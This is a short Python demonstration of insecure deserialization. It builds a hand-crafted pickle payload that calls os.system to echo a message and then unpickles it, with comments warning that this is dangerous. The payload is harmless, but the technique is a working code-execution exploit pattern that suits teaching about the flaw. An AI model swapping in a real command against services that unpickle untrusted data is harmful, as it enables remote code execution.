import pickle

# WARNING: This is dangerous!
malicious_data = b"""cos
system
(S'echo "Malicious code executed!"'
tR."""

print("Attempting to deserialize...")
pickle.loads(malicious_data)  # This will execute the echo command